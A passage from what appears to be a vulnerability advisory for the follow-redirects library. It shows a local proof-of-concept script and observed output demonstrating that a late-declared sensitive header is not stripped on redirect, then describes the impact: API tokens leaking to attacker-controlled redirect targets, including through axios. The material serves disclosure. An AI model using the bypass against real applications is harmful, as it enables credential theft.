redirector.listen(46201, "127.0.0.1", function () {
  collector.listen(46202, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 46201, path: "/",
      headers: { "X-Late": "LATE-DECLARED-VALUE" },
      beforeRedirect: function (options) { options.sensitiveHeaders.push("X-Late"); }
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; }); res.on("end", function () {
        console.log("X-Late forwarded to redirect target:", JSON.parse(body)["x-late"] || "(stripped)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).

### Impact
This is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.
